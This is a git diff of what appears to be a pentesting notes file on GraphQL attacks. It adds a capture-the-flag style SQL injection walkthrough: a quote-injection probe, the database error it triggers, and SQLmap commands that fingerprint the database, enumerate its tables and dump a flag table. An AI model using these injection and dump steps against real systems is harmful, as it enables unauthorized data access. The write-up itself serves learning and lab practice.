@@ -8,8 +8,13 @@ This document outlines common techniques for identifying and exploiting vulnerab
 
 - [GraphQL](#graphql)
     - [Overview](#overview)
-    - [Information Disclosure](#information-disclosure)
-    - [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
+    
+    - [Attacking GraphQL](#attacking-graphql)
+      - [Information Disclosure](#information-disclosure)
+      - [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
+      - [SQL Injection](#sql-injection)
+      - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
+
 
 ---
 
@@ -103,7 +108,11 @@ Suppose the `posts` query exposes an `author` field, which references a `User` o
 
 ---
 
-## Information Disclosure
+## Attacking GraphQL
+
+---
+
+### Information Disclosure
 
 The first step is determining whether the target application utilizes **GraphQL**.
 
@@ -363,7 +372,7 @@ This confirms that **sensitive data is accessible without proper authorization**
 
 ---
 
-## Insecure Direct Object Reference (IDOR)
+### Insecure Direct Object Reference (IDOR)
 
 Broken authorization vulnerabilities, particularly **Insecure Direct Object References (IDOR)**, are common in GraphQL implementations. A more detailed explanation of IDOR vulnerabilities can be found in the `web-attacks.md` file located in the `web-attacks` directory of this repository.
 
@@ -497,3 +506,136 @@ The server responds with the following data:
 This confirms that the application fails to enforce **object-level and field-level authorization**, allowing unauthorized access to sensitive user data. This behavior constitutes an **Insecure Direct Object Reference (IDOR)** vulnerability within the GraphQL API.
 
 ---
+
+### SQL Injection
+
+Injection vulnerabilities such as **SQL injection, command injection, and cross-site scripting (XSS)** can also occur in GraphQL implementations.
+
+Although GraphQL itself is a query language, it is often used as an abstraction layer over backend data sources such as **SQL databases**. If user-supplied input is not properly sanitized before being used in backend queries, the application may become vulnerable to SQL injection attacks.
+
+The first step is to enumerate the GraphQL API and identify queries that accept **user-controlled arguments**, as these are potential injection points. 
+
+Using **introspection queries** or the **Document Explorer in GraphiQL**, we discover that the following queries require arguments:
+
+- `node(id: ID!)`
+- `user(username: String!)`
+- `postByAuthor(author: String!)`
+- `post(id: Int!)`
+
+![Filtered output](images/injection.PNG)
+
+Another way to identify required arguments is to submit a query without providing them and analyze the error response. For example:
+
+```graphql
+{"query":"{post { uuid }}"}
+```
+
+```graphql
+{
+  "errors": [
+    {
+      "message": "Field \"post\" argument \"id\" of type \"Int!\" is required but not provided.",
+      "locations": [
+        {
+          "line": 1,
+          "column": 2
+        }
+      ]
+    }
+  ]
+}
+```
+
+![Filtered output](images/injection2.PNG)
+
+To test for SQL injection vulnerabilities, we inject a single quote (`'`) into the argument value and observe whether the backend returns a SQL-related error message. This can be done using either **GraphiQL** or **Burp Suite**.
+
+**GraphiQL example**:
+
+```graphql
+{
+  user(username: "admin'") {
+    id
+  }
+}
+```
+
+![Filtered output](images/injection3.PNG)
+
+**Burp Suite example**:
+
+```graphql
+{"query":"{user(username: \"admin'\") {uuid}}"}
+```
+
+![Filtered output](images/injection4.PNG)
+
+When testing via **Burp Suite**, the double quotes surrounding the argument must be escaped to preserve valid JSON syntax.
+
+The application responds with the following error message:
+
+```
+(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax; ... )
+```
+
+This error confirms the presence of a **SQL injection vulnerability** in the user query.
+
+A more efficient approach is to automate identification and exploitation using **SQLmap**.
+
+First, intercept the request in **Burp Suite** and place a `*` at the injection point to indicate where **SQLmap** should inject payloads:
+
+```graphql
+{"query":"{user(username: \"admin*\") {uuid}}"}
+```
+
+![Filtered output](images/injection7.PNG)
+
+Save the request to a file and allow **SQLmap** to parse it directly:
+
+```bash
+sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch
+```
+
+SQLmap successfully identifies the vulnerability and fingerprints the database:
+
+- Banner: `10.11.6-MariaDB-0+deb12u1`
+- Current user: `db@localhost`
+- Current database: `db`
+- DBA: `false`
+
+![Filtered output](images/injection8.PNG)
+
+We proceed by enumerating all tables within the `db` database:
+
+```bash
+sqlmap -r req.txt --tables -D db --batch
+```
+
+SQLmap identifies the following tables:
+
+- `user`
+- `flag`
+- `post`
+- `secret`
+
+![Filtered output](images/injection9.PNG)
+
+Finally, we dump the contents of the `flag` table:
+
+```bash
+sqlmap -r req.txt -D db -T flag --dump --batch
+```
+
+The flag is successfully retrieved:
+
+```
+HTB{1105f1d9480ac244a0c8f2bc47594581}
+```
+
+![Filtered output](images/injection10.PNG)
+
+This demonstrates that **GraphQL does not inherently protect against injection attacks**. If backend queries are constructed insecurely and user input is not sanitized, GraphQL APIs remain fully susceptible to traditional injection vulnerabilities.
+
+---
+
+### Cross Site Scripting (XSS)
